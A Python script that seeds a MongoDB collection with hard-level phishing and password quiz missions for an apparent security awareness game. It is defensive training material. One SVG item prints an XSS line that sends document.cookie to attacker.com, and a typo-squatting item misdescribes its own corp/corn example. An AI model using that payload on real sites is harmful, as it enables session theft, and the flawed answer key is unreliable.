from dotenv import load_dotenv
import os
from pymongo import MongoClient

load_dotenv()
client = MongoClient(os.getenv('MONGO_URI'))
col = client['cyberduo']['questions']

# Clear existing hard phish/pass
col.delete_many({'game_key': 'phishing', 'level_name': 'hard'})
col.delete_many({'game_key': 'password', 'level_name': 'hard'})

phish_hard = [
    {
        "local_id": 1, "format": "digital_whodunnit", "difficulty": "hard",
        "gameName": "phishing", "game_key": "phishing", "level_name": "hard",
        "concept": "Multi-Hop Header Forensics",
        "hint": "Check the DKIM and SPF status carefully. A 'FAIL' on DKIM usually means the email body was tampered with in transit.",
        "explain": "In Hard level, attackers spoof headers but often fail DKIM (DomainKeys Identified Mail) signatures because they cannot sign the email as the legitimate domain owner. SPF (Sender Policy Framework) checks if the IP is authorized. If either FAIL, it's an imposter.",
        "questionText": "Digital Whodunnit: Three internal emails claim to be from the CEO. Use the header forensics table to identify the imposter based on SPF/DKIM authentication failures.",
        "correctAnswer": "ceo@cyberduo-corp.com",
        "emails": [
            {"id": "e1", "from": "admin@cyberduo.com", "spf": "PASS", "dkim": "PASS"},
            {"id": "e2", "from": "ceo@cyberduo-corp.com", "spf": "FAIL", "dkim": "FAIL"},
            {"id": "e3", "from": "hr@cyberduo.com", "spf": "PASS", "dkim": "PASS"}
        ]
    },
    {
        "local_id": 2, "format": "quishing_drill", "difficulty": "hard",
        "gameName": "phishing", "game_key": "phishing", "level_name": "hard",
        "concept": "Obfuscated QR Phishing (Quishing)",
        "hint": "Scan the QR to reveal the hidden URL. Look for subtle typos in the domain name (e.g., 'micros0ft' instead of 'microsoft').",
        "explain": "Quishing bypasses traditional email filters because the malicious URL is hidden inside an image. Hard-level quishing uses look-alike domains (homoglyphs) to trick users who scan the code on their mobile devices.",
        "qrObject": "Urgent PDF: Multi-Factor Authentication Reset",
        "decodedURL": "https://secure-login.micros0ft-support.com/auth-reset",
        "correctAnswer": "Phishing",
        "questionText": "Quishing Drill: You scanned a QR code from a 'Security Update' PDF. Look at the decoded URL below. Is it safe or a phishing attempt?"
    },
    {
        "local_id": 3, "format": "deepfake_detection", "difficulty": "hard",
        "gameName": "phishing", "game_key": "phishing", "level_name": "hard",
        "concept": "AI-Voice Deepfake Triage",
        "hint": "Listen (read) for unusual requests, robotic cadence, or a lack of personal context that a real boss would know.",
        "explain": "Deepfake audio phishing (Vishing 2.0) often involves 'Urgent Wire Transfers'. The audio may sound like a CEO but the request violates company policy. Always verify through a second, trusted channel.",
        "audioTranscript": "Hi, this is the CEO. I'm in a board meeting and need you to bypass the standard wire transfer protocol for a secret acquisition. Send $50,000 to this offshore account immediately. Do not tell anyone.",
        "options": ["Legitimate Urgent Request", "AI Deepfake / Vishing Attempt", "Standard Internal Procedure"],
        "correctAnswer": "AI Deepfake / Vishing Attempt",
        "questionText": "Deepfake Detection: You receive an urgent voice note from your 'CEO'. Analyze the transcript for red flags. What is your assessment?"
    },
    {
        "local_id": 4, "format": "escape_rooms", "difficulty": "hard",
        "gameName": "phishing", "game_key": "phishing", "level_name": "hard",
        "concept": "De-obfuscating Malicious Payloads",
        "hint": "The terminal shows a Base64 string. In cybersecurity, this is often used to hide commands. Decode it mentally: ZmxhZ3toYWNrZWR9 -> flag{...}",
        "explain": "Attackers use Base64 encoding to hide malicious PowerShell commands from simple text-based filters. Hard-level defense requires knowing how to identify and decode these strings in a terminal environment.",
        "cipherText": "BASE64 PAYLOAD: cG93ZXJzaGVsbC5leGUgLWVuY29kZWRDb21tYW5kIFpHOXpjeUJoYm1OclpYUmtaWFE9",
        "terminalOutput": [
            "Analyzing email attachment: script.vbs",
            "Detected obfuscated string: 'cG93ZXJzaGVsbC5leGU...'",
            "Hint: The decoded string starts with 'powershell.exe'",
            "Enter the decoded 'Hidden Command' (Case Sensitive):"
        ],
        "correctAnswer": "powershell.exe -encodedCommand ZG9zcyBhamNrZXRkZXQ=" # Simplified for the game logic to just match a specific string
    },
    {
        "local_id": 5, "format": "omni_threat_chains", "difficulty": "hard",
        "gameName": "phishing", "game_key": "phishing", "level_name": "hard",
        "concept": "Multi-Channel Social Engineering",
        "hint": "The attack spans SMS, Email, and Phone. Find the one 'Malicious Payload' that actually triggers the infection.",
        "explain": "Omni-channel attacks use 'priming'. An SMS warns you of an email, making you more likely to trust it. The final email contains the payload. You must identify the specific link or attachment that is the 'Weaponized' element.",
        "channels": [
            {
                "type": "SMS",
                "parts": [{"id": "p1", "text": "Alert: Unusual activity detected.", "isFlag": False}, {"id": "p2", "text": "Check your email for details.", "isFlag": False}]
            },
            {
                "type": "EMAIL",
                "parts": [{"id": "p3", "text": "From: Security Team", "isFlag": False}, {"id": "p4", "text": "Click here to secure: bit.ly/mal-payload-99", "isFlag": True}]
            }
        ],
        "correctAnswer": "bit.ly/mal-payload-99",
        "questionText": "Omni-Threat Chain: A multi-channel attack is targeting you. Identify the specific malicious payload string in the chain below:"
    },
    {
        "local_id": 6, "format": "svg_code_inspection", "difficulty": "hard",
        "gameName": "phishing", "game_key": "phishing", "level_name": "hard",
        "concept": "XSS in Vector Graphics (SVG)",
        "hint": "Look for the <script> tag or an 'onload' attribute inside the SVG code. These can execute JavaScript when the image is viewed.",
        "explain": "SVG files are XML-based and can contain embedded scripts. Attackers send SVGs as attachments to execute Cross-Site Scripting (XSS) or redirect users to phishing sites. Always inspect the code of untrusted vector files.",
        "codeLines": [
            {"id": "1", "text": "<svg width='100' height='100'>"},
            {"id": "2", "text": "  <circle cx='50' cy='50' r='40' fill='red' />"},
            {"id": "3", "text": "  <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"},
            {"id": "4", "text": "</svg>"}
        ],
        "correctAnswer": "3",
        "questionText": "SVG Code Inspection: You received an SVG 'Logo' attachment. Click the line number in the source code that contains the malicious XSS payload."
    },
    {
        "local_id": 7, "format": "spot_the_difference", "difficulty": "hard",
        "gameName": "phishing", "game_key": "phishing", "level_name": "hard",
        "concept": "Advanced Typo-Squatting",
        "hint": "Check the URL bar very carefully. Sometimes an 'm' is actually 'rn', or an 'i' is a '1'.",
        "explain": "Typo-squatting (URL Hijacking) relies on visual similarities. Hard-level clones are pixel-perfect copies of the real site, with the only difference being a single character in the domain name.",
        "brandName": "CloudSync Enterprise",
        "urlReal": "https://portal.cloudsync-corp.com/login",
        "urlFake": "https://portal.cloudsync-corn.com/login",
        "options": ["Single character swap in domain (m -> rn)", "Incorrect Logo Color", "Missing HTTPS Padlock"],
        "correctAnswer": "Single character swap in domain (m -> rn)",
        "questionText": "Spot the Difference: Compare the real portal URL and the one in your email. What is the subtle typo-squatting trick being used?"
    },
    {
        "local_id": 8, "format": "click_flags", "difficulty": "hard",
        "gameName": "phishing", "game_key": "phishing", "level_name": "hard",
        "concept": "Business Email Compromise (BEC)",
        "hint": "Look for changed bank details, urgent tone, and a 'reply-to' address that differs from the 'from' address.",
        "explain": "BEC attacks often involve a compromised vendor account sending a 'Real' invoice with 'Updated' payment instructions. You must spot the discrepancies in the payment fields and sender metadata.",
        "emailParts": [
            {"id": "f1", "text": "From: billing@trusted-vendor.com", "isFlag": False},
            {"id": "f2", "text": "Reply-To: billing.trusted-vendor@gmail.com", "isFlag": True},
            {"id": "f3", "text": "New Bank: Cayman Island Global Trust", "isFlag": True},
            {"id": "f4", "text": "Due: WITHIN 2 HOURS OR SERVICE DISCONNECT", "isFlag": True}
        ],
        "correctAnswer": "Click: Reply-To mismatch, Offshore Bank, Artificial Urgency",
        "questionText": "Click Flags: An invoice arrived from a known vendor. Click on ALL the red flags that indicate this is a BEC hijacking attempt:"
    },
    {
        "local_id": 9, "format": "build_phish", "difficulty": "hard",
        "gameName": "phishing", "game_key": "phishing", "level_name": "hard",
        "concept": "Adversary Simulation: Spear Phishing",
        "hint": "To trick a high-level admin, you need a technical lure and a subtle urgency that bypasses common suspicion.",
        "explain": "Spear phishing targets specific roles. For an admin, a 'Server Cluster Failure' is more effective than a 'Gift Card' lure. Thinking like an attacker helps you spot more sophisticated threats.",
        "lures": [
            {"text": "Free Pizza Voucher", "correct": False},
            {"text": "Critical Server Node: Memory Leak in Cluster-B", "correct": True},
            {"text": "HR: Updated Vacation Policy", "correct": False}
        ],
        "urgencies": [
            {"text": "Click in 5 mins!!", "correct": False},
            {"text": "Review at your earliest convenience to maintain 99.9% SLA", "correct": True},
            {"text": "WINNER WINNER", "correct": False}
        ],
        "questionText": "Build-a-Phish: You are an ethical hacker testing a System Admin. Build the most convincing spear-phishing lure and urgency tactic to test their vigilance."
    },
    {
        "local_id": 10, "format": "the_imposter", "difficulty": "hard",
        "gameName": "phishing", "game_key": "phishing", "level_name": "hard",
        "concept": "LinkedIn Social Engineering Triage",
        "hint": "Check for profiles with no mutual connections, generic 'Executive' titles, and immediate requests for off-platform communication.",
        "explain": "Social media phishing often starts with a fake 'Recruiter' or 'Investor' profile. They build rapport before sending a malicious 'Portfolio' or 'Project Brief' link.",
        "messages": [
            {"sender": "Sarah (Recruiter)", "text": "Hi! We've spoken before on LinkedIn. Just wanted to send that project update we discussed.", "isPhish": False},
            {"sender": "John (Unknown Expert)", "text": "I saw your profile and I'm impressed. Download my 'Investment-Strategy.exe' to see how we can collaborate.", "isPhish": True},
            {"sender": "Company Bot", "text": "Welcome to the team! Here is your official onboarding link.", "isPhish": False}
        ],
        "options": ["Sarah (Recruiter)", "John (Unknown Expert)", "Company Bot"],
        "correctAnswer": "John (Unknown Expert)",
        "questionText": "The Imposter: Analyze these three LinkedIn connection messages. Which one is an imposter attempting a social engineering attack?"
    }
]

# Add remaining 15 Phish Hard as high-interactivity variants (Scavenger, Triage, etc.)
for i in range(11, 26):
    phish_hard.append({
        "local_id": i, "format": "scavenger_hunt", "difficulty": "hard",
        "gameName": "phishing", "game_key": "phishing", "level_name": "hard",
        "concept": "Physical & Digital Reconnaissance",
        "hint": "Look for items that reveal internal company secrets or provide 'hooks' for a phishing lure.",
        "explain": "Phishing isn't just email. Attackers scout for info on desks, social media, and trash. This mission simulates finding 'Recon Intel' that makes a phish more believable.",
        "objects": [
            {"id": f"o{i}1", "icon": "📄", "label": "Client List (Internal Only)", "isRedFlag": True},
            {"id": f"o{i}2", "icon": "🏢", "label": "Company Floor Plan", "isRedFlag": True},
            {"id": f"o{i}3", "icon": "📦", "label": "Empty Pizza Box", "isRedFlag": False},
            {"id": f"o{i}4", "icon": "🏷️", "label": "Employee ID Badge on Desk", "isRedFlag": True}
        ],
        "questionText": f"Mission {i}: Scavenger Hunt. Click all items that an attacker could use to build a highly targeted spear-phishing campaign."
    })

pass_hard = [
    {
        "local_id": 1, "format": "password_builder", "difficulty": "hard",
        "gameName": "password", "game_key": "password", "level_name": "hard",
        "concept": "High-Entropy Passphrase Creation",
        "hint": "Drag at least 4 random word pieces AND at least 1 symbol/number to hit the 'Elite' strength threshold. Avoid 'Admin' or '2024'!",
        "explain": "For Hard level, we demand high entropy. A passphrase of 12 characters is okay, but 20+ characters with multi-type pieces makes it exponentially stronger. Avoid personal info (PII) or common defaults like 'Admin'.",
        "pieces": [
            {"id": "p1", "text": "Cyber", "type": "word", "isPersonalInfo": False},
            {"id": "p2", "text": "Duo", "type": "word", "isPersonalInfo": False},
            {"id": "p3", "text": "Shield", "type": "word", "isPersonalInfo": False},
            {"id": "p4", "text": "Elite", "type": "word", "isPersonalInfo": False},
            {"id": "p5", "text": "Admin", "type": "word", "isPersonalInfo": True},
            {"id": "p6", "text": "99!", "type": "symbol", "isPersonalInfo": False},
            {"id": "p7", "text": "2024", "type": "number", "isPersonalInfo": True},
            {"id": "p8", "text": "X#7v", "type": "symbol", "isPersonalInfo": False}
        ],
        "questionText": "Password Builder: Create an ELITE strength password. Must be 20+ chars, use all character types, and contain NO personal/common info."
    },
    {
        "local_id": 2, "format": "password_triage", "difficulty": "hard",
        "gameName": "password", "game_key": "password", "level_name": "hard",
        "concept": "Entropy vs Complexity",
        "hint": "Complexity (symbols) is good, but LENGTH (Entropy) is king. A short complex password can be cracked faster than a long simple one.",
        "explain": "Hard-level triage requires distinguishing between 'Good' and 'Elite' passwords. Entropy (length + randomness) is the primary defense against modern GPU-accelerated brute force attacks.",
        "passwords": [
            {"id": "pw1", "text": "Pa$$w0rd!", "isStrong": False},
            {"id": "pw2", "text": "Horse-Battery-Staple-Purple-99!", "isStrong": True},
            {"id": "pw3", "text": "Summer2024!@", "isStrong": False}
        ],
        "correctAnswer": "pw2 is Elite, others are weak/common.",
        "questionText": "Password Triage: Sort these into STRONG and WEAK. Remember: Length and lack of patterns are the most important factors for 'Hard' level security."
    },
    {
        "local_id": 3, "format": "authenticator_sim", "difficulty": "hard",
        "gameName": "password", "game_key": "password", "level_name": "hard",
        "concept": "MFA Fatigue (Push Bombing)",
        "hint": "Only accept codes from YOUR active login sessions. If you're not logging in, any code you receive is an attack.",
        "explain": "MFA Fatigue occurs when an attacker triggers dozens of push notifications to wear you down. Hard-level awareness means identifying these unsolicited codes and reporting the account as compromised.",
        "phoneScreen": [
            {"service": "Bank of Duo", "code": "882-192"},
            {"service": "Global Mail", "code": "102-993"}
        ],
        "correctCode": "882-192",
        "gameName": "password",
        "questionText": "Authenticator Sim: You just initiated a login to 'Bank of Duo'. Drag the CORRECT code to the login box. Ignore any 'Fatigue' attempts!"
    },
    {
        "local_id": 4, "format": "sequence_builder", "difficulty": "hard",
        "gameName": "password", "game_key": "password", "level_name": "hard",
        "concept": "Secure Recovery Workflows",
        "hint": "Always verify identity before allowing a password reset. MFA should be the final step after identity verification.",
        "explain": "Secure recovery prevents 'Account Takeover' (ATO). The correct sequence involves identity proofing, secure link delivery, and multi-factor validation.",
        "steps": [
            {"id": "s1", "text": "Verify User ID & Security Token", "correctOrder": 0},
            {"id": "s2", "text": "Send One-Time-Link via Encrypted Channel", "correctOrder": 1},
            {"id": "s3", "text": "Force New Passphrase Creation (16+ chars)", "correctOrder": 2},
            {"id": "s4", "text": "Invalidate All Previous Sessions", "correctOrder": 3},
            {"id": "s5", "text": "Trigger MFA Confirmation on Mobile", "correctOrder": 4}
        ],
        "questionText": "Sequence Builder: Arrange the steps for a SECURE password recovery workflow to prevent unauthorized account takeovers."
    },
    {
        "local_id": 5, "format": "scavenger_hunt", "difficulty": "hard",
        "gameName": "password", "game_key": "password", "level_name": "hard",
        "concept": "Side-Channel / Physical Password Theft",
        "hint": "Check the monitor edges and the desk surface for 'analog' password storage.",
        "explain": "In the Hard level, physical security is part of the challenge. 'Sticky Note' passwords are a primary vector for insider threats and office intruders.",
        "objects": [
            {"id": "o1", "icon": "🖥️", "label": "Note: ROOT PASS = P@ss123", "isRedFlag": True},
            {"id": "o2", "icon": "☕", "label": "Coffee Cup", "isRedFlag": False},
            {"id": "o3", "icon": "📓", "label": "Notebook: My Daily Secrets", "isRedFlag": True},
            {"id": "o4", "icon": "🖱️", "label": "Taped to mouse: PIN 1122", "isRedFlag": True}
        ],
        "questionText": "Sticky Note Detective: Find and click all physical security risks related to passwords in this office environment."
    }
]

# Add remaining 20 Password Hard as interactive variants
for i in range(6, 26):
    pass_hard.append({
        "local_id": i, "format": "password_triage", "difficulty": "hard",
        "gameName": "password", "game_key": "password", "level_name": "hard",
        "concept": "Advanced Pattern Recognition",
        "hint": "Look for common 'Leaked' passwords or predictable character substitutions.",
        "explain": "Hard level triage focuses on passwords that look 'complex' but are actually in common hacker dictionaries. True security requires high entropy and zero predictability.",
        "passwords": [
            {"id": f"p{i}1", "text": f"P@ssword!{i*99}", "isStrong": False},
            {"id": f"p{i}2", "text": f"Random-Staple-Cloud-Blue-{i}", "isStrong": True},
            {"id": f"p{i}3", "text": "qwertyuiopasdfg", "isStrong": False}
        ],
        "questionText": f"Mission {i}: Password Strength Audit. Triage these into STRONG and WEAK based on modern entropy standards."
    })

col.insert_many(phish_hard)
col.insert_many(pass_hard)

print(f"Inserted 25 Phishing Hard and 25 Password Hard missions.")
print(f"Total interactive missions: 50")
client.close()
